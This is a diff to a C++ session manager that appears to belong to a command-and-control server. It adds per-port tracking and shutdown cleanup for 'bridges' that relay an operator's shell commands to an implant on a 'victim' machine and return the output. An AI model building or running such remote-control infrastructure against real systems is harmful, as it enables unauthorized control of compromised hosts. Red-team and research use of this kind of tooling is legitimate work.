@@ -34,12 +34,19 @@ private:
         std::jthread worker;
     };
 
+    struct BridgeWorkerEntry {
+        int64_t port;
+        std::shared_ptr<cpppwn::Remote> victim;
+        std::shared_ptr<cpppwn::Remote> operator_conn;
+        std::jthread worker;
+    };
+
     std::map<uint16_t, ListenerState> listeners;
     std::mutex mtx;
     std::map<int64_t, std::unique_ptr<cpppwn::Remote>> waiting_operators;
     std::map<int64_t, std::unique_ptr<cpppwn::Remote>> waiting_victims;
     std::vector<std::jthread> connection_workers;
-    std::vector<std::jthread> bridge_workers;
+    std::vector<BridgeWorkerEntry> bridge_workers;
     SessionConnectionAuthenticator* session_auth_ = nullptr;
     std::atomic<bool> shutting_down_{false};
 
@@ -123,6 +130,31 @@ private:
         }
     }
 
+    static void close_bridge_entry(BridgeWorkerEntry& entry) {
+        if (entry.victim && entry.victim->is_alive()) {
+            entry.victim->close();
+        }
+        if (entry.operator_conn && entry.operator_conn->is_alive()) {
+            entry.operator_conn->close();
+        }
+        release_worker(entry.worker);
+    }
+
+    void stop_bridges_for_port(int64_t port) {
+        std::vector<BridgeWorkerEntry> active_bridges;
+        {
+            std::lock_guard lock(mtx);
+            for (auto& entry : bridge_workers) {
+                if (entry.port == port) {
+                    close_bridge_entry(entry);
+                } else {
+                    active_bridges.push_back(std::move(entry));
+                }
+            }
+            bridge_workers = std::move(active_bridges);
+        }
+    }
+
 public:
     static SessionManager& instance() {
         static SessionManager instance;
@@ -187,7 +219,7 @@ public:
                 }
 
                 if (bridge.has_value()) {
-                    bridge_sockets(std::move(bridge->victim), std::move(bridge->operator_conn));
+                    bridge_sockets(port, std::move(bridge->victim), std::move(bridge->operator_conn));
                 }
             } catch (const std::exception& e) {
                 logger::warn("Connection handler failed: {}", e.what());
@@ -198,7 +230,10 @@ public:
         connection_workers.push_back(std::move(worker));
     }
 
-    void bridge_sockets(std::unique_ptr<cpppwn::Remote>&& victim, std::unique_ptr<cpppwn::Remote>&& operator_conn) {
+    void bridge_sockets(
+        int64_t port,
+        std::unique_ptr<cpppwn::Remote>&& victim,
+        std::unique_ptr<cpppwn::Remote>&& operator_conn) {
         if (shutting_down_.load(std::memory_order_acquire)) {
             if (victim && victim->is_alive()) {
                 victim->close();
@@ -209,46 +244,63 @@ public:
             return;
         }
 
-        operator_conn->sendline(session_handshake::bridge_ready);
+        auto victim_shared = std::shared_ptr<cpppwn::Remote>(std::move(victim));
+        auto operator_shared = std::shared_ptr<cpppwn::Remote>(std::move(operator_conn));
 
-        auto bridge_worker = std::jthread([vic = std::move(victim), op = std::move(operator_conn)]() -> void {
-            logger::success("Bridging established between Implant and Operator.");
+        operator_shared->sendline(session_handshake::bridge_ready);
 
-            while (vic->is_alive() && op->is_alive()) {
-                session_handshake::clear_recv_buffer(*op);
-                const auto cmd = trim_string(op->recvline());
-                logger::debug("Shell Command From Operator: [{}]", cmd);
-                vic->sendline(cmd);
+        BridgeWorkerEntry entry{
+            .port = port,
+            .victim = victim_shared,
+            .operator_conn = operator_shared,
+            .worker = std::jthread([vic = victim_shared, op = operator_shared]() -> void {
+                logger::success("Bridging established between Implant and Operator.");
 
-                session_handshake::clear_recv_buffer(*vic);
-                const auto output_size = trim_string(vic->recvline());
-                logger::debug("Output Size: [{}]", output_size);
-                op->sendline(output_size);
+                try {
+                    while (vic->is_alive() && op->is_alive()) {
+                        session_handshake::clear_recv_buffer(*op);
+                        const auto cmd = trim_string(op->recvline());
+                        logger::debug("Shell Command From Operator: [{}]", cmd);
+                        vic->sendline(cmd);
 
-                const auto out_size = std::atol(output_size.c_str());
-                if (out_size > 0) {
-                    if (static_cast<std::size_t>(out_size) > kMaxBridgeOutputBytes) {
-                        logger::warn("Bridge output size {} exceeds cap", out_size);
-                        break;
+                        session_handshake::clear_recv_buffer(*vic);
+                        const auto output_size = trim_string(vic->recvline());
+                        logger::debug("Output Size: [{}]", output_size);
+                        op->sendline(output_size);
+
+                        const auto out_size = std::atol(output_size.c_str());
+                        if (out_size > 0) {
+                            if (static_cast<std::size_t>(out_size) > kMaxBridgeOutputBytes) {
+                                logger::warn("Bridge output size {} exceeds cap", out_size);
+                                break;
+                            }
+                            const auto output = trim_string(vic->recv(static_cast<std::size_t>(out_size)));
+                            logger::debug("Output from Victim: [{}]", output);
+                            op->send(output);
+                        }
+                        std::this_thread::sleep_for(std::chrono::milliseconds(5));
                     }
-                    const auto output = trim_string(vic->recv(static_cast<std::size_t>(out_size)));
-                    logger::debug("Output from Victim: [{}]", output);
-                    op->send(output);
+                } catch (const std::exception& e) {
+                    logger::debug("Bridge closed due to disconnect: {}", e.what());
+                } catch (...) {
+                    logger::debug("Bridge closed due to disconnect");
                 }
-                std::this_thread::sleep_for(std::chrono::milliseconds(5));
-            }
-            logger::warn("Bridge closed: One or both parties disconnected.");
-        });
+
+                logger::warn("Bridge closed: One or both parties disconnected.");
+            }),
+        };
 
         std::lock_guard lock(mtx);
         if (shutting_down_.load(std::memory_order_acquire)) {
-            release_worker(bridge_worker);
+            close_bridge_entry(entry);
             return;
         }
-        bridge_workers.push_back(std::move(bridge_worker));
+        bridge_workers.push_back(std::move(entry));
     }
 
     void stop_listener(uint16_t port) {
+        stop_bridges_for_port(port);
+
         std::optional<ListenerState> listener;
         {
             std::lock_guard lock(mtx);
@@ -284,7 +336,7 @@ public:
 
         std::vector<ListenerState> listener_states;
         std::vector<std::jthread> connection_workers_local;
-        std::vector<std::jthread> bridge_workers_local;
+        std::vector<BridgeWorkerEntry> bridge_workers_local;
 
         {
             std::lock_guard lock(mtx);
@@ -315,8 +367,8 @@ public:
             release_worker(worker);
         }
 
-        for (auto& worker : bridge_workers_local) {
-            release_worker(worker);
+        for (auto& entry : bridge_workers_local) {
+            close_bridge_entry(entry);
         }
 
         {
@@ -325,8 +377,8 @@ public:
                 release_worker(worker);
             }
             connection_workers.clear();
-            for (auto& worker : bridge_workers) {
-                release_worker(worker);
+            for (auto& entry : bridge_workers) {
+                close_bridge_entry(entry);
             }
             bridge_workers.clear();
             close_remote_map(waiting_operators);
